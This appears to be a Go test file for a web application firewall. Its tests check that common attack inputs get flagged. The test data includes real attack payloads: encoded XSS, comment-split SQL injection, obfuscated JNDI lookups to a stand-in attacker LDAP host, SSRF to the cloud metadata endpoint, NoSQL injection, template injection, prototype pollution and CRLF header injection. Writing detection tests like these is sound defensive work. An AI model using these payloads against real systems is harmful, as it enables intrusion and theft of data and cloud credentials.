package waf

import (
	"bytes"
	"mime/multipart"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestCheckRequestDetectsEncodedXSS(t *testing.T) {
	r := httptest.NewRequest("GET", "/search?q=%26lt%3Bscript%26gt%3Balert(1)%26lt%3B/script%26gt%3B", nil)

	malicious, details, _ := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected encoded XSS to be blocked")
	}
	if !strings.Contains(details, "XSS") {
		t.Fatalf("expected XSS details, got %q", details)
	}
}

func TestCheckRequestDetectsSQLCommentEvasion(t *testing.T) {
	r := httptest.NewRequest("GET", "/items?id=1+UN/**/ION+SEL/**/ECT+password+FROM+users", nil)

	malicious, details, _ := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected SQLi comment evasion to be blocked")
	}
	if !strings.Contains(details, "SQLi") {
		t.Fatalf("expected SQLi details, got %q", details)
	}
}

func TestCheckRequestDetectsHeaderJNDI(t *testing.T) {
	r := httptest.NewRequest("GET", "/", nil)
	r.Header.Set("User-Agent", "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.local/a}")

	malicious, details, _ := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected JNDI payload in header to be blocked")
	}
	if !strings.Contains(details, "JNDI") {
		t.Fatalf("expected JNDI details, got %q", details)
	}
}

func TestCheckRequestDetectsAuthorizationHeaderPayload(t *testing.T) {
	r := httptest.NewRequest("GET", "/", nil)
	r.Header.Set("Authorization", "Bearer ${jndi:ldap://attacker.local/a}")

	malicious, details, _ := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected payload in Authorization header to be blocked")
	}
	if !strings.Contains(details, "JNDI") {
		t.Fatalf("expected JNDI details, got %q", details)
	}
}

func TestCheckRequestDetectsSSRFMetadataTarget(t *testing.T) {
	r := httptest.NewRequest("POST", "/fetch", nil)
	body := []byte("url=http://169.254.169.254/latest/meta-data/")

	malicious, details, _ := CheckRequest(r, body)
	if !malicious {
		t.Fatalf("expected SSRF metadata target to be blocked")
	}
	if !strings.Contains(details, "SSRF") {
		t.Fatalf("expected SSRF details, got %q", details)
	}
}

func TestCheckRequestDetectsPrivateIPv6SSRF(t *testing.T) {
	r := httptest.NewRequest("POST", "/fetch", nil)
	body := []byte("url=http://[fc00::10]/admin")

	malicious, details, _ := CheckRequest(r, body)
	if !malicious {
		t.Fatalf("expected private IPv6 SSRF target to be blocked")
	}
	if !strings.Contains(details, "SSRF") {
		t.Fatalf("expected SSRF details, got %q", details)
	}
}

func TestCheckRequestDetectsSingleTraversal(t *testing.T) {
	r := httptest.NewRequest("GET", "/files/../config.php", nil)

	malicious, details, _ := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected single path traversal to be blocked")
	}
	if !strings.Contains(details, "PATH_TRAVERSAL") {
		t.Fatalf("expected PATH_TRAVERSAL details, got %q", details)
	}
}

func TestCheckRequestDetectsNoSQLInjection(t *testing.T) {
	r := httptest.NewRequest("POST", "/users", nil)
	body := []byte(`{"role":{"$ne":"user"},"$where":"this.password.length > 0"}`)

	malicious, details, _ := CheckRequest(r, body)
	if !malicious {
		t.Fatalf("expected NoSQL injection to be blocked")
	}
	if !strings.Contains(details, "NoSQLi") {
		t.Fatalf("expected NoSQLi details, got %q", details)
	}
}

func TestCheckRequestDetectsSSTI(t *testing.T) {
	r := httptest.NewRequest("GET", "/render?tpl=%7B%7B7*7%7D%7D", nil)

	malicious, details, _ := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected SSTI payload to be blocked")
	}
	if !strings.Contains(details, "SSTI") {
		t.Fatalf("expected SSTI details, got %q", details)
	}
}

func TestCheckRequestDetectsPrototypePollution(t *testing.T) {
	r := httptest.NewRequest("POST", "/settings", nil)
	body := []byte(`{"__proto__":{"admin":true}}`)

	malicious, details, _ := CheckRequest(r, body)
	if !malicious {
		t.Fatalf("expected prototype pollution payload to be blocked")
	}
	if !strings.Contains(details, "PROTOTYPE_POLLUTION") {
		t.Fatalf("expected PROTOTYPE_POLLUTION details, got %q", details)
	}
}

func TestCheckRequestDetectsOpenRedirect(t *testing.T) {
	r := httptest.NewRequest("GET", "/login?next=https://evil.example", nil)

	malicious, details, _ := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected open redirect payload to be blocked")
	}
	if !strings.Contains(details, "OPEN_REDIRECT") {
		t.Fatalf("expected OPEN_REDIRECT details, got %q", details)
	}
}

func TestCheckRequestDetectsHeaderInjection(t *testing.T) {
	r := httptest.NewRequest("GET", "/", nil)
	r.Header.Set("X-Test", "safe\r\nSet-Cookie: injected=true")

	malicious, details, _ := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected header injection payload to be blocked")
	}
	if !strings.Contains(details, "HTTP_HEADER_INJECTION") {
		t.Fatalf("expected HTTP_HEADER_INJECTION details, got %q", details)
	}
}

func TestCheckRequestDetectsMultipartPayload(t *testing.T) {
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)
	field, err := writer.CreateFormField("comment")
	if err != nil {
		t.Fatalf("unexpected multipart field error: %v", err)
	}
	if _, err := field.Write([]byte("<script>alert(1)</script>")); err != nil {
		t.Fatalf("unexpected multipart write error: %v", err)
	}
	if err := writer.Close(); err != nil {
		t.Fatalf("unexpected multipart close error: %v", err)
	}

	r := httptest.NewRequest("POST", "/upload", nil)
	r.Header.Set("Content-Type", writer.FormDataContentType())

	malicious, details, _ := CheckRequest(r, body.Bytes())
	if !malicious {
		t.Fatalf("expected multipart payload to be blocked")
	}
	if !strings.Contains(details, "XSS") {
		t.Fatalf("expected XSS details, got %q", details)
	}
}

func TestCheckRequestBlocksMalformedMultipart(t *testing.T) {
	body := []byte("--broken\r\nContent-Disposition: form-data; name=\"file\"\r\n\r\nabc\r\n--different--\r\n")
	r := httptest.NewRequest("POST", "/upload", nil)
	r.Header.Set("Content-Type", "multipart/form-data; boundary=broken")

	malicious, details, _ := CheckRequest(r, body)
	if !malicious {
		t.Fatalf("expected malformed multipart to be blocked")
	}
	if !strings.Contains(details, "MULTIPART") {
		t.Fatalf("expected multipart error details, got %q", details)
	}
}

func TestCheckResponseDetectsSQLLeak(t *testing.T) {
	r := httptest.NewRequest("GET", "/items", nil)
	resp := httptest.NewRecorder().Result()
	resp.Request = r

	body := []byte("SQLSTATE[42000]: syntax error near 'DROP'")
	malicious, details, _ := CheckResponse(resp, body)
	if !malicious {
		t.Fatalf("expected SQL error leak to be blocked")
	}
	if !strings.Contains(details, "RESPONSE_SQL_ERROR") {
		t.Fatalf("expected RESPONSE_SQL_ERROR details, got %q", details)
	}
}

func TestCheckResponseDetectsStackTrace(t *testing.T) {
	body := []byte("Traceback (most recent call last):\n  File \"app.py\", line 1")
	malicious, details, _ := CheckResponse(nil, body)
	if !malicious {
		t.Fatalf("expected stack trace leak to be blocked")
	}
	if !strings.Contains(details, "RESPONSE_STACK_TRACE") {
		t.Fatalf("expected RESPONSE_STACK_TRACE details, got %q", details)
	}
}

func TestCheckResponseDetectsReflectedXSS(t *testing.T) {
	body := []byte(`<html><script>alert(1)</script></html>`)
	malicious, details, _ := CheckResponse(nil, body)
	if !malicious {
		t.Fatalf("expected reflected XSS to be blocked")
	}
	if !strings.Contains(details, "RESPONSE_XSS_REFLECTION") {
		t.Fatalf("expected RESPONSE_XSS_REFLECTION details, got %q", details)
	}
}

func TestCheckRequestAllowsNormalRequest(t *testing.T) {
	r := httptest.NewRequest("POST", "/profile?tab=settings", nil)
	body := []byte("name=Maria&note=regular+update")

	malicious, details, _ := CheckRequest(r, body)
	if malicious {
		t.Fatalf("expected normal request to pass, got %q", details)
	}
}
